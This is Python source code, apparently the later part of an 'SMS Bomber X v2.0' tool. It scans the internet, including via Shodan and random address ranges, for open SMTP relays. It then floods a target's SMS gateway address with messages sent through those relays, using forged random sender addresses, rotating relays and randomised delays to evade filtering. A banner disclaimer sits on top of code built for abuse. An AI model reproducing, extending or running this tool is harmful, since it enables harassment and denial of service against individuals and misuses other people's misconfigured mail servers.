                if config.enable_port_precheck and task_precheck_id is not None:
                    # Submit pre-check to executor? No, do it sequentially before submitting main test for simplicity?
                    # Or submit pre-check first, then conditionally submit main test? Leads to complex future handling.
                    # Let's do it sequentially here for now. This might slow down submission slightly.
                    if not is_port_open(host, port, config.port_precheck_timeout):
                         port_is_likely_open = False
                         log.debug(f"Port pre-check failed for {host}:{port}. Skipping full relay test.")
                         progress.update(task_precheck_id, advance=1)
                         # Update main task too, but mark as skipped pre-check
                         progress.update(task_relay_test_id, advance=1, description=f"[cyan]Relay Testing ({found_count} Found, {precheck_skipped_count+1} Skipped)")
                         # Update manager with 'precheck_failed' status? Or just ignore? Let's ignore for cache.
                         # relay_manager.add_or_update_relay(host, port, "precheck_failed", source=target['source'])
                         precheck_skipped_count += 1
                         continue # Skip submitting the main test future
                    else:
                        # Port seems open, advance pre-check progress
                        progress.update(task_precheck_id, advance=1)
                # --- Submit Full Relay Test ---
                if port_is_likely_open:
                    log.debug(f"Submitting full relay test for {host}:{port}")
                    future = executor.submit(test_single_relay, target, config.scan_timeout)
                    futures.add(future)

            # --- Process Completed Full Relay Tests ---
            log.debug(f"Submitted {len(futures)} full relay tests. Waiting for results...")
            for future in concurrent.futures.as_completed(futures):
                tested_count += 1 # Count actual tests completed
                
                 # Allow task finish if scan was stopped early
                if progress.tasks[task_relay_test_id].finished: continue 
                
                try:
                    target_back, connection, status = future.result()
                    host_back, port_back, source_back = target_back['host'], target_back['port'], target_back['source']
                    
                    relay_manager.add_or_update_relay(host_back, port_back, status, source=source_back, connection=connection)
                    
                    if status == "working":
                        found_count += 1
                        progress.update(task_relay_test_id, advance=1, description=f"[cyan]Relay Testing ({found_count} Found, {precheck_skipped_count} Skipped)")
                        if not scan_stopped_early and config.relay_pool_target > 0 and len(relay_manager.active_relays) >= config.relay_pool_target:
                            log.info(f"Relay pool target ({config.relay_pool_target}) reached during result processing.")
                            scan_stopped_early = True
                    else:
                        log.debug(f"Full test failed {host_back}:{port_back} - Status: {status}")
                        progress.update(task_relay_test_id, advance=1, description=f"[cyan]Relay Testing ({found_count} Found, {precheck_skipped_count} Skipped)")
                        
                except concurrent.futures.CancelledError:
                    log.debug("Relay test task cancelled.")
                    progress.update(task_relay_test_id, advance=1) 
                except Exception as exc:
                    log.error(f'Error processing relay test result: {exc}', exc_info=True)
                    progress.update(task_relay_test_id, advance=1) 

    except KeyboardInterrupt:
        log.warning("Scan interrupted by user (KeyboardInterrupt).")
        progress.stop() 
        raise 
    except Exception as e:
        log.critical(f"Critical error during scan execution: {e}", exc_info=True)
        progress.stop()

    finally:
        log.debug("Advanced scan execution block finished.")
        # Finalize progress bars
        total_processed = tested_count + precheck_skipped_count
        remaining = len(scan_targets) - total_processed
        if task_precheck_id is not None and not progress.tasks[task_precheck_id].finished:
             progress.update(task_precheck_id, completed=len(scan_targets), description="[blue]Port Pre-checking Finished")
        if not progress.tasks[task_relay_test_id].finished:
            final_relay_desc = f"[cyan]Relay Test Finished ({found_count} Found, {precheck_skipped_count} Skipped)"
            if scan_stopped_early: final_relay_desc = f"[yellow]Scan Halted ({found_count} Found - Target Met)"
            progress.update(task_relay_test_id, completed=len(scan_targets), description=final_relay_desc)
            
    log.info(f"Scan phase complete. Tested: {tested_count}, Skipped (Pre-check): {precheck_skipped_count}. Found: {len(relay_manager.active_relays)} working relays.")
    relay_manager.save_cache()


# --- Bombing Logic ---
def run_bombing(config: AppConfig, relay_manager: RelayManager, progress: Progress) -> None:
    """Manages the message sending process using the active relay pool."""
    # ... (Implementation remains largely the same as previous version - kept for brevity) ...
    if not relay_manager.active_relays:
        log.error("Bombing Error: No active relays available."); progress.add_task("[red]Bombing Skipped (No Relays)", total=1, completed=1); return
    messages = load_messages(config.message_file)
    if not messages:
         log.error("Bombing Error: No messages loaded."); progress.add_task("[red]Bombing Skipped (No Messages)", total=1, completed=1); return

    task_bomb_id = progress.add_task("[magenta]Sending Messages", total=config.message_count, start=True)
    sent_count = 0; failure_this_message = 0; total_failures = 0
    max_total_failures_before_abort = len(relay_manager.active_relays) * 3 

    log.info(f"Starting bombing: Target={config.target_email}, Count={config.message_count}, Delay=({config.delay_min:.1f}-{config.delay_max:.1f}s), Relays={len(relay_manager.active_relays)}")
    
    try:
        while sent_count < config.message_count:
            if not relay_manager.active_relays: log.error("Relay pool empty. Aborting bombing."); break
            if total_failures >= max_total_failures_before_abort: log.critical(f"Max failures ({max_total_failures_before_abort}) exceeded. Aborting."); break

            current_relay = relay_manager.get_next_active_relay()
            if not current_relay or not current_relay.connection:
                log.warning("Could not get working relay. Waiting..."); time.sleep(1.0); total_failures += 1; failure_this_message += 1; continue

            host_port = f"{current_relay.host}:{current_relay.port}"
            progress.update(task_bomb_id, description=f"[magenta]Sending ({sent_count+1}/{config.message_count}) via {host_port}")

            try: # Prepare message
                 from_local = random_string(random.randint(6, 12)); from_domain_chars = string.ascii_lowercase + string.digits
                 from_domain = f"{''.join(random.choice(from_domain_chars) for _ in range(random.randint(4, 8)))}.{random.choice(['com', 'net', 'org', 'info', 'biz'])}"
                 from_email = f"{from_local}@{from_domain}" ; message_body = random.choice(messages) ; msg = MIMEMultipart('alternative')
                 msg['From'] = from_email; msg['To'] = config.target_email; subject_prefix = random.choice(["Notify", "Alert", "Info", "Ref"])
                 msg['Subject'] = f"{subject_prefix}: {random_string(random.randint(8, 15))}" ; msg['Date'] = smtplib.email.utils.formatdate(localtime=True)
                 msg['Message-ID'] = smtplib.make_msgid(domain=from_domain) ; msg['X-Priority'] = str(random.randint(3, 5))
                 msg['User-Agent'] = f"Agent/{random.uniform(1.0, 5.0):.1f}" ; msg.attach(MIMEText(message_body, 'plain', 'utf-8')) ; message_string = msg.as_string()
            except Exception as prep_err: log.error(f"Msg prep failed: {prep_err}. Skipping.", exc_info=True); total_failures += 1; failure_this_message += 1; continue 

            try: # Send attempt
                log.debug(f"Sendmail msg {sent_count + 1} via {host_port}")
                current_relay.connection.sendmail(from_email, [config.target_email], message_string) 
                log.info(f"Message {sent_count + 1}/{config.message_count} sent via {host_port}")
                sent_count += 1; failure_this_message = 0; total_failures = 0
                progress.update(task_bomb_id, advance=1, description=f"[magenta]Sent ({sent_count}/{config.message_count})") 
                if sent_count < config.message_count: 
                    delay = random.uniform(config.delay_min, config.delay_max); log.debug(f"Waiting {delay:.2f}s...")
                    progress.update(task_bomb_id, description=f"[magenta]Waiting {delay:.1f}s... ({sent_count}/{config.message_count})")
                    time.sleep(delay) 
            # --- Handle Send Errors ---
            except (smtplib.SMTPServerDisconnected, smtplib.SMTPResponseException, smtplib.SMTPConnectError, socket.error) as relay_err:
                log.warning(f"Relay {host_port} conn failed: {relay_err}. Marking failed."); relay_manager.mark_relay_failed(current_relay, reason=f"send_fail_{type(relay_err).__name__}")
                failure_this_message += 1; total_failures += 1; progress.update(task_bomb_id, description=f"[yellow]Relay {host_port} failed. Retrying msg {sent_count + 1}...") 
            except smtplib.SMTPRecipientsRefused as e:
                 log.error(f"Recipient {config.target_email} REFUSED by {host_port}: {e}. ABORTING."); relay_manager.mark_relay_failed(current_relay, reason="recipient_refused") 
                 failure_this_message += 1; total_failures += 1; progress.update(task_bomb_id, description=f"[bold red]Recipient Refused. ABORTING."); break 
            except smtplib.SMTPSenderRefused as e:
                 log.warning(f"Sender refused by {host_port}: {e}. Marking & retrying msg."); relay_manager.mark_relay_failed(current_relay, reason="sender_refused")
                 failure_this_message += 1; total_failures += 1; progress.update(task_bomb_id, description=f"[yellow]Sender Refused. Retrying msg {sent_count + 1}...")
            except smtplib.SMTPDataError as e:
                 log.warning(f"DATA error via {host_port}: {e}. Marking & retrying msg."); relay_manager.mark_relay_failed(current_relay, reason="data_error")
                 failure_this_message += 1; total_failures += 1; progress.update(task_bomb_id, description=f"[yellow]DATA Error. Retrying msg {sent_count + 1}...")
            except Exception as e:
                 log.critical(f"Unexpected send error {host_port}: {e}", exc_info=True); relay_manager.mark_relay_failed(current_relay, reason="unexpected_send_error")
                 failure_this_message += 1; total_failures += 1; progress.update(task_bomb_id, description=f"[red]Unexpected Error. Retrying msg {sent_count + 1}...")
            
            # Safety break for same message failing too often
            if failure_this_message >= (len(relay_manager.active_relays) + 2):
                 log.error(f"Skipping msg {sent_count + 1} after {failure_this_message} attempts."); failure_this_message = 0
                 progress.update(task_bomb_id, advance=0, description=f"[red]Skipped message {sent_count+1}...") 
                 sent_count += 1 # Move to next index eventually
                 time.sleep(1.0) 

    except KeyboardInterrupt: log.warning("Bombing interrupted by user."); progress.stop(); raise 
    except Exception as e: log.critical(f"Critical bombing error: {e}", exc_info=True); progress.stop()
    finally:
        log.debug("Bombing execution block finished.")
        final_sent = sent_count
        try:
            if task_bomb_id in progress.task_ids and not progress.tasks[task_bomb_id].finished:
                final_desc = f"[magenta]Bombing Finished ({final_sent}/{config.message_count} Sent)"; progress.update(task_bomb_id, completed=config.message_count, description=final_desc)
        except IndexError: log.debug("Bombing progress task gone.")
        log.info(f"Bombing complete. Sent: {final_sent}/{config.message_count}.")

# --- Profile Management ---
def list_profiles() -> List[str]:
    """Returns sorted list of available profile names."""
    # ... (Implementation identical to previous version) ...
    try: return sorted([f.stem for f in PROFILES_DIR.glob("*.json") if f.is_file()]) if PROFILES_DIR.is_dir() else []
    except OSError as e: log.error(f"Error accessing profiles dir {PROFILES_DIR}: {e}"); return []

def load_profile(profile_name: str) -> Optional[AppConfig]:
    """Loads an AppConfig from a profile file."""
    # ... (Implementation identical to previous version) ...
    if not profile_name: return None; profile_path = PROFILES_DIR / f"{profile_name}.json"
    if profile_path.is_file():
        try:
            log.debug(f"Loading profile: {profile_path}")
            with open(profile_path, 'r', encoding='utf-8') as f: config_dict = json.load(f)
            config = AppConfig(); loaded_keys = 0
            for key, value in config_dict.items():
                if hasattr(config, key):
                    try: # Basic type conversion check
                        expected_type = AppConfig.__annotations__.get(key)
                        if expected_type == float and isinstance(value, int): value = float(value)
                        elif expected_type == int and isinstance(value, float): value = int(value)
                        setattr(config, key, value); loaded_keys += 1
                    except TypeError as e: log.warning(f"Type mismatch key '{key}' profile '{profile_name}'. Using default. Error: {e}")
                else: log.warning(f"Ignoring unknown key '{key}' in profile '{profile_name}'.")
            config.profile_name = profile_name; log.info(f"Loaded {loaded_keys} settings from profile '{profile_name}'."); return config
        except (json.JSONDecodeError, IOError, TypeError) as e: log.error(f"Failed loading profile '{profile_name}': {e}"); return None
        except Exception as e: log.error(f"Unexpected error loading profile '{profile_name}': {e}", exc_info=True); return None
    else: log.warning(f"Profile file not found: '{profile_path}'"); return None

def save_profile(config: AppConfig) -> bool:
    """Saves the current AppConfig to a profile file, returns success status."""
    # ... (Implementation identical to previous version, returns bool) ...
    profile_name_regex = r"^[a-zA-Z0-9_\-. ]+$"; profile_name_to_save = config.profile_name.strip()
    if not profile_name_to_save or not re.match(profile_name_regex, profile_name_to_save):
        log.error(f"Invalid profile name '{config.profile_name}'."); new_name = Prompt.ask("[yellow]Enter valid profile name:", default="default_profile").strip()
        if not new_name or not re.match(profile_name_regex, new_name): log.error("Still invalid. Aborting save."); return False
        config.profile_name = new_name; profile_name_to_save = new_name
    profile_path = PROFILES_DIR / f"{profile_name_to_save}.json"; log.debug(f"Saving profile to: {profile_path}")
    try:
        config_dict = config.__dict__; profile_path.parent.mkdir(parents=True, exist_ok=True)
        with open(profile_path, 'w', encoding='utf-8') as f: json.dump(config_dict, f, indent=2, ensure_ascii=False)
        log.info(f"Configuration saved as profile '{profile_name_to_save}'."); return True
    except (IOError, TypeError, OSError) as e: log.error(f"Failed saving profile '{profile_name_to_save}': {e}"); return False
    except Exception as e: log.error(f"Unexpected error saving profile '{profile_name_to_save}': {e}", exc_info=True); return False


# --- Enhanced Interactive Configuration ---
def get_user_config_interactive() -> Optional[AppConfig]:
    """Interactively gathers configuration settings, including advanced options."""
    config = AppConfig() 
    console.print(Panel("SMS Bomber X Configuration v2.0", title="[bold cyan]Setup[/]", style="cyan", border_style="cyan"))

    # --- Profile Loading ---
    available_profiles = list_profiles()
    if available_profiles:
        profile_choices = ["[New Configuration]"] + available_profiles
        load_choice = Prompt.ask("Load profile or start new?", choices=profile_choices, default="[New Configuration]")
        if load_choice != "[New Configuration]":
            loaded_config = load_profile(load_choice)
            if loaded_config:
                 if Confirm.ask(f"Use loaded profile '[green]{load_choice}[/]' settings?", default=True): return loaded_config
                 else: config = loaded_config; console.print("[yellow]Modifying loaded profile settings.[/]")
            else: console.print(f"[red]Failed loading '{load_choice}'. Starting new config.[/]")
    else: console.print("[i blue]No profiles found. Starting new configuration.[/i]")

    # --- Basic Target & Message Settings ---
    console.print(Panel("Target & Message Settings", style="magenta"))
    # ... (Target Email, Message Count, Delays, Message File - identical prompts to previous version) ...
    while True: # Target Email
         current = f" (current: [green]{config.target_email}[/])" if config.target_email else ""
         inp = Prompt.ask(f"Enter target SMS gateway address{current}", default=config.target_email); 
         if validate_email(inp): config.target_email = inp; break
         else: console.print("[red]Invalid email format.[/]")
    config.message_count = IntPrompt.ask("Number of messages to send", default=config.message_count) # Message Count
    config.delay_min = FloatPrompt.ask("Minimum delay (seconds)", default=config.delay_min) # Delay Min
    config.delay_max = FloatPrompt.ask("Maximum delay (seconds)", default=config.delay_max) # Delay Max
    if config.delay_min < 0: config.delay_min = 0.0
    if config.delay_max < config.delay_min: config.delay_max = config.delay_min + 1.0; console.print(f"[yellow]Set max delay to: {config.delay_max}[/]")
    current = f" (current: [green]{config.message_file}[/])" if config.message_file else " (current: use defaults)"; # Message File
    if Confirm.ask(f"Use custom message file?{current}", default=bool(config.message_file)):
         default = config.message_file if config.message_file else "messages.txt"; inp = Prompt.ask("Path to message file", default=default)
         if not Path(inp).is_file(): console.print(f"[yellow]Warning:[/yellow] File '{inp}' not found now.")
         config.message_file = str(Path(inp))
    else: config.message_file = None

    # --- Advanced Scanner Source Configuration ---
    console.print(Panel("Relay Source Configuration", title="[bold blue]Scanning Sources[/]", style="blue", border_style="blue"))

    # Target File
    current = f" (current: [green]{config.target_file}[/])" if config.target_file else ""
    if Confirm.ask(f"Load scan targets from file?{current}", default=bool(config.target_file)):
         default = config.target_file if config.target_file else "targets.txt"; inp = Prompt.ask("Path to target file (IP/CIDR/host per line)", default=default)
         if not Path(inp).is_file(): console.print(f"[yellow]Warning:[/yellow] File '{inp}' not found now.")
         config.target_file = str(Path(inp))
    else: config.target_file = None

    # ASN Scan
    if IPWHOIS_AVAILABLE:
        current = f" (current: [green]{config.scan_asn}[/])" if config.scan_asn else ""
        if Confirm.ask(f"Scan IP ranges for a specific ASN?{current}", default=bool(config.scan_asn)):
            config.scan_asn = Prompt.ask("Enter ASN (e.g., AS15169 or 15169)", default=config.scan_asn or "")
        else: config.scan_asn = None
    else: log.warning("ASN scanning disabled ('ipwhois' library not installed).")

    # Shodan Scan
    if SHODAN_AVAILABLE:
        current = " (current: [green]Enabled[/])" if config.use_shodan else " (current: [red]Disabled[/])"
        config.use_shodan = Confirm.ask(f"Use Shodan API to find potential relays?{current}", default=config.use_shodan)
        if config.use_shodan:
             current_key_status = "[green]Provided[/]" if config.shodan_api_key else "[yellow]Needed[/]"
             # Use Password prompt to hide key entry
             api_key_input = Password.ask(f"Enter your Shodan API key ({current_key_status})", default=config.shodan_api_key or "")
             if api_key_input: config.shodan_api_key = api_key_input
             elif not config.shodan_api_key: # If still no key after prompt
                  log.error("Shodan API key required but not provided. Disabling Shodan search.")
                  config.use_shodan = False 
             if config.use_shodan: # If still enabled, ask for limit
                  config.shodan_query_limit = IntPrompt.ask("Max IPs to retrieve from Shodan per port query", default=config.shodan_query_limit)
                  if config.shodan_query_limit <= 0: config.shodan_query_limit = 100 # Sensible default if invalid input
    else: log.warning("Shodan scanning disabled ('shodan' library not installed).")

    # Manual Range Scan (only ask if no other sources strongly defined?)
    # Decide logic: if file OR asn OR shodan are selected, maybe default range scan is less needed?
    needs_range = not (config.target_file or config.scan_asn or config.use_shodan)
    ask_range_msg = "Enter manual scan target (hostname, IP, CIDR, or blank for random /16)"
    if needs_range: ask_range_msg += " [yellow](Needed if no File/ASN/Shodan)[/yellow]"
    current = f" (current: [green]{config.scan_range_raw}[/])" if config.scan_range_raw else (" (current: random)" if not needs_range else "")
    # Prompt for range unless other sources guarantee targets
    config.scan_range_raw = Prompt.ask(ask_range_msg, default=config.scan_range_raw)


    # --- General Scanner Settings ---
    console.print(Panel("General Scanner Settings", style="blue"))
    ports_input = Prompt.ask("SMTP ports to scan/query (comma-separated)", default=",".join(map(str, config.scan_ports)))
    config.scan_ports = parse_ports(ports_input)
    config.scan_timeout = IntPrompt.ask("Relay test connection timeout (seconds)", default=config.scan_timeout); config.scan_timeout=max(1, config.scan_timeout)
    config.scan_workers = IntPrompt.ask("Max concurrent scan workers", default=config.scan_workers); config.scan_workers=max(1, config.scan_workers)
    config.relay_pool_target = IntPrompt.ask("Stop scan after finding this many relays (0 = find all)", default=config.relay_pool_target); config.relay_pool_target=max(0, config.relay_pool_target)
    config.enable_port_precheck = Confirm.ask("Enable quick port open pre-check?", default=config.enable_port_precheck)
    if config.enable_port_precheck:
         config.port_precheck_timeout = IntPrompt.ask("Port pre-check timeout (seconds, suggest < 5)", default=config.port_precheck_timeout); config.port_precheck_timeout = max(1, config.port_precheck_timeout)

    # --- Cache & Log Settings ---
    console.print(Panel("Cache & Log Settings", style="yellow"))
    config.use_relay_cache = Confirm.ask("Use relay cache file?", default=config.use_relay_cache)
    old_log_found = Path("open_smtp_servers.log").exists()
    log_prompt_add = " ([green]found legacy file[/])" if old_log_found else ""
    config.load_previous_log = Confirm.ask(f"Prioritize relays from 'open_smtp_servers.log'?{log_prompt_add}", default=config.load_previous_log and old_log_found)
    
    # --- Save Profile ---
    console.print(Panel("Save Configuration", style="green"))
    if Confirm.ask("Save this configuration as a profile?", default=False):
        profile_name = Prompt.ask("Enter profile name", default=config.profile_name or "unnamed_profile").strip()
        config.profile_name = profile_name
        save_profile(config) # Will prompt again if name is invalid inside function
    else: log.info("Configuration not saved as profile.")

    return config

# --- Main Application Logic ---
def display_banner():
    """Prints the application banner and info paths."""
    # ... (Banner remains the same) ...
    banner = r"""[bold cyan]
# __________                  __             __     ________             .___ 
# \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
#  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
#  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
#  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
#         \/              \/      \/     \/               \/              \/  
[/]
[bold blue] SMS Bomber X - v2.0 (Advanced Scanning) [/]
[i yellow] Disclaimer: Use responsibly, ethically, and only with explicit permission. [/]"""
    console.print(Panel.fit(banner, border_style="blue"))
    info_text = (f"Log File : [dim cyan]{LOG_FILE.resolve()}[/]\nProfiles : [dim cyan]{PROFILES_DIR.resolve()}[/]\nCache File: [dim cyan]{RELAY_CACHE_FILE.resolve()}[/]")
    console.print(Panel(info_text, title="[bold]Paths[/]", style="dim", border_style="yellow", expand=False))

def main_app():
    """Main application entry point and execution flow."""
    display_banner() 
    
    progress = Progress( # Define progress bar columns
        TextColumn("[progress.description]{task.description}", justify="left"), BarColumn(bar_width=None),
        TextColumn("[progress.percentage]{task.percentage:>3.1f}%"), SpinnerColumn(spinner_name="dots", style="cyan"),
        TimeRemainingColumn(), TextColumn("•"), TimeElapsedColumn(),
        console=console, transient=False, expand=True )

    config: Optional[AppConfig] = None
    relay_manager: Optional[RelayManager] = None 
    previous_log_relays: List[str] = [] 

    # --- Load legacy log file data ---
    old_log_path = Path("open_smtp_servers.log")
    if old_log_path.is_file():
        try:
            with open(old_log_path, 'r', encoding='utf-8') as f:
                previous_log_relays = [line.strip() for line in f if line.strip() and ':' in line]
            if previous_log_relays: log.info(f"Found {len(previous_log_relays)} entries in legacy log.")
        except Exception as e: log.warning(f"Could not read legacy log '{old_log_path}': {e}")

    try:
        # --- Initialize managers and get configuration ---
        relay_manager = RelayManager(RELAY_CACHE_FILE, console)
        config = get_user_config_interactive()
        if not config: console.print("[bold red]Configuration incomplete or cancelled. Exiting.[/]"); return 

        # --- Run operations within Live context for progress bars ---
        console.print("\n", Panel("[bold green]Starting Operations[/]", expand=False, style="green", border_style="green"))
        with Live(progress, refresh_per_second=10, console=console, vertical_overflow="visible", transient=False) as live:
            
            # --- Phase 1: Scan/Discover Relays ---
            run_scan(config, relay_manager, previous_log_relays if config.load_previous_log else [], progress)
            live.update(progress) # Update display after scan finishes

            # --- Phase 2: Execute Bombing Run ---
            if relay_manager.active_relays:
                live.update(progress) # Show final scan status before prompt
                console.print("\n") 
                if Confirm.ask(f"[bold green]Scan found {len(relay_manager.active_relays)} working relays. Start bombing?[/]", default=True):
                    run_bombing(config, relay_manager, progress)
                else:
                    console.print("[yellow]Bombing run cancelled by user.[/]")
                    progress.add_task("[yellow]Bombing Cancelled", total=1, completed=1)
            else:
                 console.print("\n[bold red]Scan completed, but no working relays are available for bombing.[/]")
                 progress.add_task("[red]Bombing Skipped (No Relays)", total=1, completed=1)
                 
            live.update(progress) # Ensure final status is shown

    except KeyboardInterrupt: console.print("\n[bold yellow]Operation interrupted by user (Ctrl+C).[/]"); log.warning("Operation manually interrupted.")
    except Exception as e:
        console.print("\n[bold red]An unexpected critical error occurred![/]")
        log.critical("Critical error in main application loop:", exc_info=True)
        console.print_exception(show_locals=False, width=console.width) # Show traceback in console
    finally:
        # --- Cleanup actions ---
        console.print("\n", Panel("[bold cyan]Shutting Down[/]", style="cyan", border_style="cyan"))
        if relay_manager:
            try: relay_manager.close_all_connections()
            except Exception as close_err: log.error(f"Cleanup error (closing conns): {close_err}", exc_info=True)
            try: relay_manager.save_cache() 
            except Exception as save_err: log.error(f"Cleanup error (saving cache): {save_err}", exc_info=True)
        console.print("[bold magenta]Exited SMS Bomber X.[/]")

# --- Script Execution Entry Point ---
if __name__ == "__main__":
    main_app()
